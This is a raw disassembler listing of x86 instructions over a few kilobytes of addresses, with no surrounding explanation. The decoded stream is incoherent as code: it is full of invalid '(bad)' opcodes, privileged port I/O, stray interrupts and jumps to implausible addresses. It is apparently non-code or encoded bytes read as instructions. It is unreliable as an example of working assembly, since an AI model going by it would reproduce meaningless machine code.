  40c3d3:	div    DWORD PTR [edi]
  40c3d5:	fwait
  40c3d6:	outs   dx,BYTE PTR ds:[esi]
  40c3d7:	push   cs
  40c3d8:	push   esi
  40c3d9:	adc    BYTE PTR [edx-0x44e00721],al
  40c3df:	add    DWORD PTR [esi],edi
  40c3e1:	out    dx,al
  40c3e2:	or     al,0xa1
  40c3e4:	adc    eax,0xf3d8b1b8
  40c3e9:	arpl   WORD PTR [ebx],si
  40c3eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3ec:	call   0xfcd9ecb2
  40c3f1:	cmc    
  40c3f2:	mov    ecx,0xe0fe0768
  40c3f7:	xor    edi,DWORD PTR [edi]
  40c3f9:	pop    ebp
  40c3fa:	and    ch,BYTE PTR [eax+0x4c4f3811]
  40c400:	adc    al,0xbb
  40c402:	mov    ch,0xb4
  40c405:	or     DWORD PTR [ebx-0x35279708],edx
  40c40b:	adc    al,ah
  40c40d:	test   bh,0x38
  40c410:	lea    esi,[esp+esi*4+0x147c26ad]
  40c417:	sub    esi,esi
  40c419:	fldenv [ebp+0x27e86efb]
  40c41f:	xlat   BYTE PTR ds:[ebx]
  40c420:	add    eax,0xc438fe0f
  40c425:	scas   eax,DWORD PTR es:[edi]
  40c426:	xlat   BYTE PTR ds:[ebx]
  40c427:	std    
  40c428:	fnclex 
  40c42a:	cmp    dh,BYTE PTR [eax-0x52b18d0b]
  40c430:	lahf   
  40c431:	sub    DWORD PTR [edi+0x33],eax
  40c434:	sub    DWORD PTR [eax],edi
  40c436:	xor    dl,0x42
  40c439:	popa   
  40c43a:	in     eax,0x2d
  40c43c:	into   
  40c43d:	mov    ebp,0x6007e76e
  40c442:	aaa    
  40c443:	add    eax,0x3882b455
  40c448:	imul   edx,DWORD PTR [eax],0x67c2e913
  40c44e:	les    esi,FWORD PTR [esi+0x3f35acee]
  40c454:	imul   edi,DWORD PTR [eax],0x12
  40c457:	aad    0xd0
  40c459:	jno    0x40c3ef
  40c45b:	xor    esp,DWORD PTR [edx-0x703fe3df]
  40c461:	mov    edi,eax
  40c463:	xchg   edi,eax
  40c464:	pop    esi
  40c465:	dec    edi
  40c466:	mov    ?,WORD PTR [esi]
  40c468:	mov    al,ds:0x4b02aea5
  40c46d:	pop    es
  40c46e:	push   esi
  40c46f:	(bad)  
  40c470:	dec    ebp
  40c471:	stc    
  40c472:	(bad)  
  40c473:	and    dh,BYTE PTR [ebp+0xa]
  40c476:	xchg   ebp,eax
  40c477:	mov    al,ds:0xbc571e25
  40c47c:	cmc    
  40c47d:	aas    
  40c47e:	dec    ebp
  40c47f:	(bad)  
  40c480:	mov    eax,ds:0x3da6e2cc
  40c485:	cmp    dh,dl
  40c487:	or     BYTE PTR [esi-0x1dbecef6],0x88
  40c48e:	outs   dx,BYTE PTR ds:[esi]
  40c48f:	mov    cl,0x57
  40c491:	pop    esi
  40c492:	and    al,0x70
  40c494:	fdivr  st,st(1)
  40c496:	stos   DWORD PTR es:[edi],eax
  40c497:	cmp    BYTE PTR [ecx-0x6b],al
  40c49a:	ret    
  40c49b:	ret    
  40c49c:	mov    ecx,0xff49959e
  40c4a1:	cwde   
  40c4a2:	outs   dx,BYTE PTR ds:[esi]
  40c4a3:	jle    0x40c4c4
  40c4a5:	fs (bad) 
  40c4a7:	sub    bh,dh
  40c4a9:	test   DWORD PTR es:[eax],edi
  40c4ac:	scas   al,BYTE PTR es:[edi]
  40c4ad:	cli    
  40c4ae:	loope  0x40c458
  40c4b0:	adc    al,0xeb
  40c4b2:	ret    0xe33f
  40c4b5:	shl    DWORD PTR [eax],1
  40c4b7:	int3   
  40c4b8:	and    cl,BYTE PTR [ecx+0x118d78ad]
  40c4be:	inc    eax
  40c4bf:	jns    0x40c4d8
  40c4c1:	cmp    ebp,edx
  40c4c3:	and    edi,ebx
  40c4c5:	jmp    0x73fbc819
  40c4ca:	sti    
  40c4cb:	inc    ebx
  40c4cc:	call   0xae42f29e
  40c4d1:	xor    eax,0xa49140f8
  40c4d6:	jmp    0x99e7:0xd9affe38
  40c4dd:	xchg   esp,eax
  40c4de:	les    ebx,FWORD PTR [ebp+esi*8-0x22]
  40c4e2:	scas   al,BYTE PTR es:[edi]
  40c4e3:	ror    DWORD PTR [esi],cl
  40c4e5:	jbe    0x40c4ba
  40c4e7:	gs xor al,0xa4
  40c4ea:	xor    BYTE PTR [eax],dh
  40c4ec:	mov    dl,0x5a
  40c4ee:	cwde   
  40c4ef:	cs jp  0x40c49a
  40c4f2:	das    
  40c4f3:	dec    esi
  40c4f4:	les    ebx,FWORD PTR [ebp+0x73f13e6e]
  40c4fa:	iret   
  40c4fb:	xor    ebx,esp
  40c4fd:	rol    DWORD PTR [ebx],1
  40c4ff:	cmp    edi,ebp
  40c501:	ja     0x40c52c
  40c503:	sub    DWORD PTR [ecx+0x1841dbb8],0xffffffc9
  40c50a:	or     ebx,edi
  40c50c:	adc    al,0xc7
  40c50e:	cs push ebp
  40c510:	xor    eax,0xd1fce9d6
  40c515:	cmp    ebp,DWORD PTR ds:0x4667266c
  40c51b:	ds data16 jp 0x40c4fa
  40c51f:	ret    
  40c520:	jl     0x40c562
  40c522:	mov    ebx,DWORD PTR [ecx-0x1d]
  40c525:	xor    DWORD PTR [ebp-0x5c],edi
  40c528:	nop
  40c529:	cmp    eax,edi
  40c52b:	dec    ah
  40c52d:	inc    edi
  40c52e:	pop    ebp
  40c52f:	cmp    edi,ebp
  40c531:	in     al,0xe5
  40c533:	scas   eax,DWORD PTR es:[edi]
  40c534:	outs   dx,BYTE PTR ds:[esi]
  40c535:	push   ebx
  40c536:	sub    DWORD PTR [eax],ecx
  40c538:	adc    DWORD PTR [edi+edx*4],edx
  40c53b:	in     al,dx
  40c53c:	mov    ds:0xbb98acfc,eax
  40c541:	jle    0x40c502
  40c543:	gs hlt 
  40c545:	cmp    edi,DWORD PTR ds:0xa341395c
  40c54b:	xchg   ebp,eax
  40c54c:	pop    ecx
  40c54d:	push   edx
  40c54e:	lods   al,BYTE PTR ds:[esi]
  40c54f:	adc    dl,BYTE PTR [edi-0x45]
  40c552:	cld    
  40c553:	jno    0x40c4ea
  40c555:	(bad)  
  40c556:	int    0x83
  40c558:	push   ss
  40c559:	cmc    
  40c55a:	ds sub al,0x86
  40c55d:	ds dec ebx
  40c55f:	nop
  40c560:	inc    esi
  40c561:	int    0xa8
  40c563:	mov    edi,0xf03f4c15
  40c568:	inc    ebp
  40c569:	mov    DWORD PTR [esi+0xd],ebp
  40c56c:	das    
  40c56d:	(bad)
  40c571:	sub    eax,0x99633912
  40c576:	mov    cl,0x20
  40c578:	xchg   ecx,eax
  40c579:	mov    ebx,0x92f57fbb
  40c57e:	inc    edi
  40c57f:	push   esi
  40c580:	repnz cs xor eax,0xe3e3479d
  40c587:	add    ch,dh
  40c589:	scas   al,BYTE PTR es:[edi]
  40c58a:	ja     0x40c5e3
  40c58c:	fld    st(6)
  40c58e:	test   bh,ah
  40c590:	cmc    
  40c591:	push   esi
  40c592:	fcomip st,st(2)
  40c594:	and    BYTE PTR [edx+0x3b43a560],dl
  40c59a:	xor    eax,0xbad070e3
  40c59f:	les    esp,FWORD PTR [ebp-0xa3ddad5]
  40c5a5:	ret    0x8ec6
  40c5a8:	mov    WORD PTR [eax+0x195e2778],fs
  40c5ae:	push   0x3f3b26d6
  40c5b3:	adc    al,0x51
  40c5b5:	pminub mm7,mm0
  40c5b8:	(bad)  
  40c5ba:	jl     0x40c5c0
  40c5bc:	cmc    
  40c5bd:	ins    DWORD PTR es:[edi],dx
  40c5be:	xchg   edi,eax
  40c5bf:	ret    0x5878
  40c5c2:	int    0x71
  40c5c4:	sbb    BYTE PTR [eax],bh
  40c5c6:	sub    edx,ebp
  40c5c8:	ins    BYTE PTR es:[edi],dx
  40c5c9:	pop    edi
  40c5ca:	loopne 0x40c561
  40c5cc:	mov    cl,bh
  40c5ce:	outs   dx,BYTE PTR ds:[esi]
  40c5cf:	or     al,0x62
  40c5d1:	mov    esp,0xccaf307d
  40c5d6:	stos   DWORD PTR es:[edi],eax
  40c5d7:	cmp    BYTE PTR [ebx],dh
  40c5d9:	dec    esp
  40c5da:	sti    
  40c5db:	ror    BYTE PTR [edi+0x51],0x1d
  40c5df:	adc    DWORD PTR [eax],esi
  40c5e1:	push   edi
  40c5e2:	sub    eax,0x25d08839
  40c5e7:	(bad)  
  40c5e8:	ins    DWORD PTR es:[edi],dx
  40c5e9:	setg   BYTE PTR [eax+0x3fcfe471]
  40c5f0:	cmc    
  40c5f1:	lods   al,BYTE PTR ds:[esi]
  40c5f2:	js     0x40c5a3
  40c5f4:	(bad)  
  40c5f5:	dec    ebp
  40c5f6:	in     al,0xc9
  40c5f8:	jp     0x40c5cb
  40c5fa:	ins    BYTE PTR es:[edi],dx
  40c5fb:	mov    dh,0xb2
  40c5fd:	cld    
  40c5fe:	jg     0x40c660
  40c600:	sub    DWORD PTR [eax+0x29],ecx
  40c603:	clc    
  40c604:	out    dx,al
  40c605:	test   al,0xf5
  40c607:	aas    
  40c608:	inc    esi
  40c609:	push   ss
  40c60a:	mov    BYTE PTR [eax+0x52d2032b],ch
  40c610:	cmc    
  40c611:	add    DWORD PTR [ebx+0x6b55d03a],esp
  40c617:	xchg   esi,eax
  40c618:	out    0x38,al
  40c61a:	repnz out 0x72,al
  40c61d:	fdiv   DWORD PTR [eax]
  40c61f:	sub    ah,BYTE PTR [edi+0x2af96f1b]
  40c625:	mov    gs,WORD PTR [edx+edi*2+0x3a]
  40c629:	loope  0x40c67d
  40c62b:	jecxz  0x40c634
  40c62d:	test   al,0x95
  40c62f:	int    0x19
  40c631:	sbb    edi,esp
  40c633:	mov    ah,0xdb
  40c635:	cmp    edi,DWORD PTR [edi]
  40c637:	fnsave [edi-0x17569eac]
  40c63d:	and    DWORD PTR [edi+0x5f1cbd89],edi
  40c643:	cdq    
  40c644:	ret    0x73d2
  40c647:	adc    BYTE PTR [ebx+0x22],0xab
  40c64b:	cli    
  40c64c:	sub    al,0xdd
  40c64e:	jne    0x40c698
  40c650:	fst    QWORD PTR [ebp+ecx*1+0xb46ee49]
  40c657:	sub    al,0xf5
  40c659:	cwde   
  40c65a:	dec    ebx
  40c65b:	dec    edi
  40c65c:	xchg   edx,eax
  40c65d:	leave  
  40c65e:	test   edx,0x2a872266
  40c664:	ins    DWORD PTR es:[edi],dx
  40c665:	pop    es
  40c666:	inc    edi
  40c667:	stos   DWORD PTR es:[edi],eax
  40c668:	mov    ch,0x21
  40c66a:	xchg   edx,eax
  40c66b:	inc    edi
  40c66c:	test   al,0xbd
  40c66e:	outs   dx,BYTE PTR ds:[esi]
  40c66f:	pushw  ds
  40c671:	push   esi
  40c672:	push   edi
  40c673:	adc    dl,dl
  40c675:	stc    
  40c676:	lahf   
  40c677:	cmp    al,ch
  40c679:	ss popf 
  40c67b:	imul   edx,DWORD PTR [edi],0x33f932f1
  40c681:	aaa    
  40c682:	fstp   TBYTE PTR [eax-0x28aec123]
  40c688:	cwde   
  40c689:	fmul   st(6),st
  40c68b:	cmp    BYTE PTR [edi+ebx*1-0x18ecdf6a],dh
  40c692:	test   DWORD PTR [ebp-0x1c],edi
  40c695:	addps  xmm5,XMMWORD PTR [ebx]
  40c698:	dec    ebp
  40c699:	jno    0x40c61d
  40c69b:	pop    edi
  40c69c:	inc    ebp
  40c69d:	mov    al,0xd1
  40c69f:	test   DWORD PTR [edx+0x5da6db3b],esp
  40c6a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6a6:	test   BYTE PTR [esi+0x4e6e1fe3],dl
  40c6ac:	in     eax,0xc2
  40c6ae:	inc    esi
  40c6af:	add    al,0x3b
  40c6b1:	pop    esp
  40c6b2:	out    0x38,al
  40c6b4:	shr    ebx,cl
  40c6b6:	inc    ebp
  40c6b7:	jo     0x40c65b
  40c6b9:	adc    al,BYTE PTR [edx-0x2f]
  40c6bc:	xor    BYTE PTR [ecx],bh
  40c6be:	push   ds
  40c6bf:	xor    BYTE PTR [edi],dh
  40c6c1:	fbld   TBYTE PTR [esi+edx*4-0x47f3669b]
  40c6c8:	mov    dh,0xe2
  40c6ca:	(bad)  
  40c6cb:	jle    0x40c745
  40c6cd:	or     DWORD PTR [eax-0x38],esp
  40c6d0:	ror    BYTE PTR [esi+ecx*8],1
  40c6d3:	xchg   esp,eax
  40c6d4:	out    0xa1,al
  40c6d6:	pop    eax
  40c6d7:	pmaddwd mm6,mm0
  40c6da:	jbe    0x40c6b4
  40c6dc:	add    al,0xe3
  40c6de:	push   ss
  40c6df:	idiv   BYTE PTR [eax]
  40c6e1:	cmp    BYTE PTR [edi+0xb],dl
  40c6e4:	inc    ebp
  40c6e5:	push   0xf65184f1
  40c6ea:	outs   dx,BYTE PTR ds:[esi]
  40c6eb:	shr    BYTE PTR [ebp+eax*1+0x62],0xea
  40c6f0:	xchg   DWORD PTR [eax-0x5f],esp
  40c6f3:	ds add DWORD PTR ds:[ecx-0x514d3432],esi
  40c6fb:	(bad)  
  40c6fc:	call   0xe1fd74c9
  40c701:	cmp    BYTE PTR [edx],al
  40c703:	fdiv   DWORD PTR [edi-0x58662119]
  40c709:	cmp    esp,DWORD PTR [edi+ebx*8]
  40c70c:	and    al,BYTE PTR [edi+0x67]
  40c70f:	add    al,0x67
  40c711:	mov    eax,0x8e343469
  40c716:	dec    esp
  40c717:	je     0x40c70f
  40c719:	sub    ah,cl
  40c71b:	outs   dx,DWORD PTR ds:[esi]
  40c71c:	fist   DWORD PTR [edi+0x42]
  40c71f:	inc    edi
  40c720:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c721:	cmp    al,0x3f
  40c723:	sbb    al,0xde
  40c725:	call   FWORD PTR [eax]
  40c727:	mov    dh,0x85
  40c729:	pop    edx
  40c72a:	nop
  40c72b:	inc    eax
  40c72c:	ret    
  40c72d:	hlt    
  40c72e:	outs   dx,DWORD PTR ds:[esi]
  40c72f:	dec    ebx
  40c730:	cmp    BYTE PTR [edx],ch
  40c732:	jmp    0xaea539a9
  40c737:	sub    al,BYTE PTR [edx-0x71]
  40c73a:	outs   dx,BYTE PTR ds:[esi]
  40c73b:	popf   
  40c73c:	ins    BYTE PTR es:[edi],dx
  40c73d:	daa    
  40c73e:	add    dh,dh
  40c740:	cmc    
  40c741:	cli    
  40c742:	mov    esp,DWORD PTR [eax+0x20]
  40c745:	addr16 jmp 0x40c752
  40c748:	mov    WORD PTR [ebx],?
  40c74a:	or     DWORD PTR [edx+0x31c7c3de],ebp
  40c750:	mov    esp,0xc9fc6f2f
  40c755:	inc    eax
  40c756:	mov    bl,0x59
  40c758:	cli    
  40c759:	pop    ds
  40c75a:	cmp    al,0x39
  40c75c:	push   ds
  40c75d:	push   ds
  40c75e:	shl    DWORD PTR [esi],0xe9
  40c761:	push   ss
  40c762:	enter  0xe8b6,0x13
  40c766:	add    eax,0x8894d9f3
  40c76b:	mov    al,ds:0x32499d82
  40c770:	out    dx,al
  40c771:	js     0x40c747
  40c773:	rcl    esi,1
  40c775:	cmp    ecx,DWORD PTR [esi+ebx*4]
  40c778:	mov    ebp,0xf5193659
  40c77d:	and    esp,DWORD PTR [edx+0x5dd41d35]
  40c783:	push   es
  40c784:	hlt    
  40c785:	cmp    ebp,DWORD PTR [ebx-0x1e]
  40c788:	lea    eax,[eax]
  40c78a:	imul   BYTE PTR [ecx+edx*8+0x2]
  40c78e:	pop    esi
  40c78f:	addr16 cmc 
  40c791:	cmp    al,0xa8
  40c793:	xchg   esp,eax
  40c794:	sub    eax,0xb6bde3ae
  40c799:	xor    al,0xf8
  40c79b:	sbb    eax,0x56e956d
  40c7a0:	(bad)  
  40c7a1:	fcomp  DWORD PTR [esi+0x50793413]
  40c7a7:	mov    ecx,0xdc5e9d4e
  40c7ac:	xor    esp,eax
  40c7ae:	jo     0x40c7d5
  40c7b0:	hlt    
  40c7b1:	pop    DWORD PTR [esi+0x79]
  40c7b4:	xor    eax,0xc903d924
  40c7b9:	pop    ecx
  40c7ba:	outs   dx,DWORD PTR ds:[esi]
  40c7bb:	xchg   edi,eax
  40c7bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7bd:	inc    BYTE PTR [edi]
  40c7bf:	xor    BYTE PTR [ecx+0x46392614],0x8b
  40c7c6:	test   DWORD PTR [ebp-0x75a81dae],esi
  40c7cc:	cmc    
  40c7cd:	pushf  
  40c7ce:	add    BYTE PTR [eax-0x18],0xd7
  40c7d2:	mov    DWORD PTR ds:0xba433ba5,esp
  40c7d8:	(bad)  
  40c7d9:	xlat   BYTE PTR ds:[ebx]
  40c7da:	je     0x40c7db
  40c7dc:	inc    ebx
  40c7dd:	mov    ecx,0xbcf7176e
  40c7e2:	push   esi
  40c7e3:	std    
  40c7e4:	pop    ecx
  40c7e5:	rcr    BYTE PTR [edi],1
  40c7e7:	cmp    DWORD PTR [esp+ebp*2+0x730ccd04],ebx
  40c7ee:	je     0x40c82a
  40c7f0:	in     al,dx
  40c7f1:	sub    edx,DWORD PTR [ecx]
  40c7f3:	addr16 push 0xffffff99
  40c7f6:	outs   dx,BYTE PTR ds:[esi]
  40c7f7:	pop    eax
  40c7f8:	cdq    
  40c7f9:	(bad)  
  40c7fa:	mov    ds:0x9d60b138,eax
  40c7ff:	inc    esi
  40c800:	and    al,0x44
  40c802:	xchg   ebx,eax
  40c803:	pop    edx
  40c804:	in     al,dx
  40c805:	xchg   BYTE PTR [ecx-0x9],dh
  40c808:	(bad)  
  40c809:	pop    edi
  40c80a:	or     eax,0xe48383f9
  40c80f:	das    
  40c810:	dec    edi
  40c811:	cmp    cl,bl
  40c813:	lods   eax,DWORD PTR ds:[esi]
  40c814:	xchg   edi,eax
  40c815:	mov    ah,BYTE PTR [eax+0x17]
  40c818:	sub    bh,BYTE PTR [eax+0x6f]
  40c81b:	fdiv   DWORD PTR [ecx-0x2d]
  40c81e:	sub    ah,BYTE PTR [ebx-0x23]
  40c821:	fst    QWORD PTR [esi]
  40c823:	cmp    DWORD PTR [edi-0x1c],ecx
  40c826:	sbb    ebp,DWORD PTR [edi+0x5c23f1cc]
  40c82c:	cmc    
  40c82d:	sub    BYTE PTR [eax-0xe273c15],al
  40c833:	and    edx,DWORD PTR [esi+0x34]
  40c836:	pop    ebp
  40c837:	(bad)  
  40c838:	lahf   
  40c839:	mov    ecx,0xaf647d2
  40c83e:	push   esi
  40c83f:	scas   al,BYTE PTR es:[edi]
  40c840:	out    dx,al
  40c841:	mov    BYTE PTR [edx+0x67fda122],0x39
  40c848:	mov    ecx,0x61e08cea
  40c84d:	adc    dl,BYTE PTR [edx]
  40c84f:	cwde   
  40c850:	jmp    0xabab97d6
  40c855:	(bad)  
  40c856:	out    dx,al
  40c857:	cdq    
  40c858:	inc    eax
  40c859:	inc    ebp
  40c85a:	inc    ebp
  40c85b:	ds jecxz 0x40c815
  40c85e:	push   es
  40c85f:	push   es
  40c860:	popa   
  40c861:	in     al,dx
  40c862:	mov    dl,0x4c
  40c864:	ins    BYTE PTR es:[edi],dx
  40c865:	int3   
  40c866:	outs   dx,BYTE PTR ds:[esi]
  40c867:	mov    dl,0xee
  40c869:	out    dx,eax
  40c86a:	ret    0xeb12
  40c86d:	rcr    DWORD PTR [ebp-0x2abddbc8],cl
  40c873:	ret    
  40c874:	push   es
  40c875:	out    0x10,al
  40c877:	and    eax,0x92b57cf5
  40c87c:	mov    ds:0xe540e490,eax
  40c881:	cmp    BYTE PTR [edx+0x31],dh
  40c884:	call   0xa25f1f7
  40c889:	lds    ebp,FWORD PTR [esi+0x12]
  40c88c:	adc    BYTE PTR ds:0x2135af26,0xd3
  40c893:	cmp    BYTE PTR [edx+0x73001723],ch
  40c899:	out    dx,al
  40c89a:	push   0xcf7de349
  40c89f:	dec    ebp
  40c8a0:	sbb    bh,BYTE PTR [eax]
  40c8a2:	push   ecx
  40c8a3:	pop    ebp
  40c8a4:	cmp    eax,0x3339125d
  40c8a9:	pop    ecx
  40c8aa:	xchg   ebx,eax
  40c8ab:	das    
  40c8ac:	push   edx
  40c8ad:	es sub dh,dh
  40c8b0:	add    esp,DWORD PTR [esi-0x21]
  40c8b3:	leave  
  40c8b4:	in     al,dx
  40c8b5:	jo     0x40c862
  40c8b7:	lods   eax,DWORD PTR ds:[esi]
  40c8b8:	pop    es
  40c8b9:	aas    
  40c8ba:	lods   eax,DWORD PTR ds:[esi]
  40c8bb:	pop    eax
  40c8bc:	popf   
  40c8bd:	push   esi
  40c8be:	xchg   ebp,eax
  40c8bf:	xor    ebx,esp
  40c8c1:	xchg   edi,eax
  40c8c2:	lods   al,BYTE PTR ds:[esi]
  40c8c3:	pop    esp
  40c8c4:	cmc    
  40c8c5:	fistp  WORD PTR [edx+0x68a77dae]
  40c8cb:	and    al,0x13
  40c8cd:	sub    ch,BYTE PTR [ebx]
  40c8cf:	add    DWORD PTR [eax-0x28],ecx
  40c8d2:	fcmovbe st,st(4)
  40c8d4:	push   ecx
  40c8d5:	cmp    BYTE PTR [ebx-0x7],ch
  40c8d8:	cld    
  40c8d9:	xchg   edx,eax
  40c8da:	push   ecx
  40c8db:	dec    eax
  40c8dc:	mov    dl,0xd9
  40c8de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8df:	add    edi,DWORD PTR [esi]
  40c8e1:	cmp    BYTE PTR [ebp+0x3069d56b],al
  40c8e7:	ret    0xaa67
  40c8ea:	inc    esp
  40c8eb:	and    eax,0x7e43cdff
  40c8f0:	arpl   WORD PTR [ecx],bp
  40c8f2:	jmp    DWORD PTR [ecx]
  40c8f4:	aas    
  40c8f5:	fcom   DWORD PTR [edi+0x7d]
  40c8f8:	adc    al,0x82
  40c8fa:	dec    esi
  40c8fb:	mov    al,0xb5
  40c8fd:	or     ecx,edx
  40c8ff:	and    dh,ch
  40c901:	sub    al,0x5d
  40c903:	cmp    ecx,esp
  40c905:	leave  
  40c906:	cwde   
  40c907:	scas   al,BYTE PTR es:[edi]
  40c908:	jb     0x40c8a2
  40c90a:	int    0xc0
  40c90c:	cmc    
  40c90d:	jecxz  0x40c8ee
  40c90f:	dec    DWORD PTR [edi+ebp*4]
  40c912:	push   ds
  40c913:	(bad)  
  40c914:	mov    al,0x3b
  40c916:	in     al,dx
  40c917:	sbb    BYTE PTR [esi],cl
  40c919:	xor    DWORD PTR [ebp+ecx*4+0x7275939b],esp
  40c920:	inc    edi
  40c921:	sbb    eax,0xa8f8e879
  40c926:	test   eax,0x8f738450
  40c92b:	enter  0x9a3,0x95
  40c92f:	mov    ebp,0xf78e9bc7
  40c934:	cmp    DWORD PTR [ebx-0x440ae8f5],esp
  40c93a:	popf   
  40c93b:	and    BYTE PTR [ebx+0x56],ch
  40c93e:	inc    eax
  40c93f:	mov    bh,0xbc
  40c941:	cmp    edi,DWORD PTR [ebx]
  40c943:	in     eax,dx
  40c944:	hlt    
  40c945:	sub    eax,0x4df6da90
  40c94a:	outs   dx,DWORD PTR ds:[esi]
  40c94b:	daa    
  40c94c:	xchg   BYTE PTR [edx+ebx*4-0x3eca52be],dh
  40c953:	cmp    eax,0x4f72b234
  40c958:	sub    al,0xb8
  40c95a:	call   0x6ed9a1c1
  40c95f:	xchg   ebx,eax
  40c960:	xor    ah,BYTE PTR [ebp+0xc]
  40c963:	les    ebx,FWORD PTR ds:0x58389efc
  40c969:	jne    0x40c974
  40c96b:	sub    al,0x1b
  40c96d:	fbld   TBYTE PTR [eax]
  40c96f:	inc    ebx
  40c970:	je     0x40c964
  40c972:	outs   dx,BYTE PTR ds:[esi]
  40c973:	dec    eax
  40c974:	clc    
  40c975:	push   0x7fad8aac
  40c97a:	jne    0x40c9b3
  40c97c:	pop    ebx
  40c97d:	xchg   BYTE PTR [esi-0x26d20a70],al
  40c983:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c984:	mov    ds:0x5536ad82,eax
  40c989:	cmp    al,al
  40c98b:	clc    
  40c98c:	ins    BYTE PTR es:[edi],dx
  40c98d:	idiv   esi
  40c98f:	test   BYTE PTR [eax+0x2640ab3b],0x8d
  40c996:	xchg   edi,eax
  40c997:	pushf  
  40c998:	mov    bh,0x8a
  40c99a:	outs   dx,BYTE PTR ds:[esi]
  40c99b:	scas   al,BYTE PTR es:[edi]
  40c99c:	sub    al,0x63
  40c99e:	(bad)  
  40c99f:	pop    edx
  40c9a0:	ror    bl,1
  40c9a2:	fistp  QWORD PTR [eax]
  40c9a4:	sub    ebp,DWORD PTR [ebx+eax*4-0x7b]
  40c9a8:	sbb    cl,BYTE PTR [ebp+0x28ec70e4]
  40c9ae:	inc    ebx
  40c9af:	sbb    ecx,DWORD PTR [esp+ecx*8-0x250a45d4]
  40c9b6:	rol    DWORD PTR [edi],cl
  40c9b8:	iret   
  40c9b9:	mov    edi,0xd24338ce
  40c9be:	push   0x4fd576c1
  40c9c3:	shl    ebp,cl
  40c9c5:	push   es
  40c9c6:	pop    ds
  40c9c7:	stos   BYTE PTR es:[edi],al
  40c9c8:	pop    esp
  40c9c9:	fsubr  QWORD PTR [esi+0x723844bc]
  40c9cf:	cmp    eax,0x211e271
  40c9d4:	and    al,0x73
  40c9d6:	outs   dx,DWORD PTR ds:[esi]
  40c9d7:	adc    esi,DWORD PTR [edi]
  40c9d9:	(bad)  
  40c9da:	leave  
  40c9db:	cmp    DWORD PTR [esi-0x3cc72495],eax
  40c9e1:	lods   eax,DWORD PTR ds:[esi]
  40c9e2:	repnz stos BYTE PTR es:[edi],al
  40c9e4:	dec    ecx
  40c9e5:	pop    esp
  40c9e6:	and    BYTE PTR [ebx-0xb],dh
  40c9e9:	sbb    eax,0x67e353df
  40c9ee:	or     esi,esp
  40c9f0:	mov    ecx,0xa963bd3b
  40c9f5:	dec    ebp
  40c9f6:	fiadd  DWORD PTR [ecx]
  40c9f8:	jno    0x40ca2b
  40c9fa:	outs   dx,BYTE PTR ds:[esi]
  40c9fb:	sbb    al,0x30
  40c9fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9fe:	stos   BYTE PTR es:[edi],al
  40c9ff:	popf   
  40ca00:	arpl   si,di
  40ca02:	shl    eax,0x0
  40ca05:	or     ch,BYTE PTR [ecx+0xa]
  40ca08:	pushf  
  40ca09:	sub    DWORD PTR [eax],esi
  40ca0b:	es xchg ebp,eax
  40ca0d:	pop    edx
  40ca0e:	xor    eax,0x6ec88546
  40ca13:	or     DWORD PTR [ecx+0x57],0x3c60eec5
  40ca1a:	loope  0x40ca1c
  40ca1c:	inc    edx
  40ca1d:	pop    es
  40ca1e:	outs   dx,BYTE PTR ds:[esi]
  40ca1f:	mov    esi,0x41447b2d
  40ca24:	ret    
  40ca25:	fidivr WORD PTR [ebp-0x53]
  40ca28:	mov    ds:0xdef8be3d,al
  40ca2d:	stos   BYTE PTR es:[edi],al
  40ca2e:	fwait
  40ca2f:	data16 sar BYTE PTR ds:0xed4e1f8d,0xbb
  40ca37:	mov    dh,0xa8
  40ca39:	add    ch,BYTE PTR [esi-0x4a]
  40ca3c:	add    DWORD PTR [ecx+0x25ef4913],ebx
  40ca42:	retf   
  40ca43:	pop    eax
  40ca44:	dec    BYTE PTR [eax]
  40ca46:	jnp    0x40ca59
  40ca48:	mov    dl,0xb4
  40ca4a:	dec    esi
  40ca4b:	xor    BYTE PTR [edx+edi*1-0x280901c0],cl
  40ca52:	lea    eax,[esi+0x7cac97d]
  40ca58:	lds    esi,FWORD PTR [edx]
  40ca5a:	leave  
  40ca5b:	push   esi
  40ca5c:	les    edi,FWORD PTR [ebx]
  40ca5e:	pop    edi
  40ca5f:	adc    DWORD PTR [ecx+0x3d213f73],eax
  40ca65:	mov    ch,BYTE PTR [esi+0x36]
  40ca68:	cmp    al,0x43
  40ca6a:	es cmp ah,ch
  40ca6d:	mov    cs:0x621f8538,al
  40ca73:	fidivr WORD PTR [ebp+eax*1+0x21]
  40ca77:	fwait
  40ca78:	ret    
  40ca79:	push   eax
  40ca7a:	outs   dx,DWORD PTR ds:[esi]
  40ca7b:	pop    ebp
  40ca7c:	inc    eax
  40ca7d:	inc    esp
  40ca7e:	in     al,dx
  40ca7f:	(bad)  
  40ca80:	xor    al,0xc9
  40ca82:	(bad)  
  40ca83:	push   esi
  40ca84:	mov    ds:0xfc3f90a0,al
  40ca89:	sti    
  40ca8a:	mov    DWORD PTR [esi+0x3e507c81],edi
  40ca90:	pop    ecx
  40ca91:	sub    al,0x88
  40ca93:	mov    dh,0xf5
  40ca95:	enter  0xcb13,0x84
  40ca99:	pop    esp
  40ca9a:	cs sub eax,0x3b4f6800
  40caa0:	mov    fs,ebx
  40caa2:	pop    edx
  40caa3:	cmp    dh,ch
  40caa5:	loopne 0x40cae7
  40caa7:	imul   esp,DWORD PTR [eax+0x65],0x3911e272
  40caae:	xor    DWORD PTR [ecx+0x35],ecx
  40cab1:	scas   eax,DWORD PTR es:[edi]
  40cab2:	push   ss
  40cab3:	xor    eax,0xf4d7de1c
  40cab8:	pop    es
  40cab9:	(bad)  
  40caba:	push   0xffffff97
  40cabc:	jmp    0x40cb0f
  40cabe:	push   es
  40cabf:	jns    0x40ca68
  40cac1:	shl    edi,cl
  40cac3:	stos   DWORD PTR es:[edi],eax
  40cac4:	in     al,dx
  40cac5:	hlt    
  40cac6:	mov    dh,BYTE PTR [edi-0x5e]
  40cac9:	ins    BYTE PTR es:[edi],dx
  40caca:	out    0xb1,al
  40cacc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cacd:	dec    edi
  40cace:	das    
  40cacf:	xor    al,0x96
  40cad1:	clc    
  40cad2:	mov    ss,WORD PTR [ecx+0x2aa64075]
  40cad8:	js     0x40caa3
  40cada:	in     al,dx
